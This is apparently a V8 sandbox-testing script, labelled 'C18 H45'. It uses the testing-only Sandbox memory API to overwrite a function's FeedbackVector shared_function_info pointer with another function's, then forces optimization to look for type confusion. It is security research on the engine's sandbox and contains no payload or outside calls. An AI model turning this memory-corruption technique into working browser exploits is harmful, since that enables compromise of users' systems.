// C18 H45: corrupt FeedbackVector.shared_function_info to SFI with different metadata.
// Requires --sandbox-testing --allow-natives-syntax.
const kHeapObjectTag = 0x1;
const kJSFunctionType = Sandbox.getInstanceTypeIdFor("JS_FUNCTION_TYPE");
const kJSFunctionFeedbackCellOffset =
    Sandbox.getFieldOffset(kJSFunctionType, "feedback_cell");
const kJSFunctionSharedFunctionInfoOffset =
    Sandbox.getFieldOffset(kJSFunctionType, "shared_function_info");
const kFeedbackCellType = Sandbox.getInstanceTypeIdFor("FEEDBACK_CELL_TYPE");
const kFeedbackCellValueOffset =
    Sandbox.getFieldOffset(kFeedbackCellType, "value");
const kFeedbackVectorSharedFunctionInfoOffset = 16;

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const getPtr = (obj) => Sandbox.getAddressOf(obj) + kHeapObjectTag;
const getField = (ptr, offset) =>
    memory.getUint32(ptr + offset - kHeapObjectTag, true);
const setField = (ptr, offset, value) =>
    memory.setUint32(ptr + offset - kHeapObjectTag, value, true);

function feedbackVectorOf(fn) {
  let fp = getPtr(fn);
  let fc = getField(fp, kJSFunctionFeedbackCellOffset);
  return getField(fc, kFeedbackCellValueOffset);
}
function sfiOf(fn) {
  return getField(getPtr(fn), kJSFunctionSharedFunctionInfoOffset);
}

var C18_H45_A = 13;
function f() {
  return C18_H45_A;
}
function g(o) {
  return o.x + o.y;
}
function caller(o) {
  return f() + g(o);
}

let o = {x: 1, y: 2};
%EnsureFeedbackVectorForFunction(f);
%EnsureFeedbackVectorForFunction(g);
%PrepareFunctionForOptimization(caller);
for (let i = 0; i < 1000; i++) {
  f();
  g(o);
  caller(o);
}

let fvF = feedbackVectorOf(f);
let oldSfi = getField(fvF, kFeedbackVectorSharedFunctionInfoOffset);
let gSfi = sfiOf(g);
print(`before f=${f()} caller=${caller(o)}`);
print(`fvF=0x${fvF.toString(16)} oldSfi=0x${oldSfi.toString(16)} gSfi=0x${gSfi.toString(16)}`);

setField(fvF, kFeedbackVectorSharedFunctionInfoOffset, gSfi);

print(`after-corrupt f=${f()} caller=${caller(o)}`);
%OptimizeFunctionOnNextCall(caller);
print(`after-opt caller=${caller(o)} f=${f()}`);
print("done");
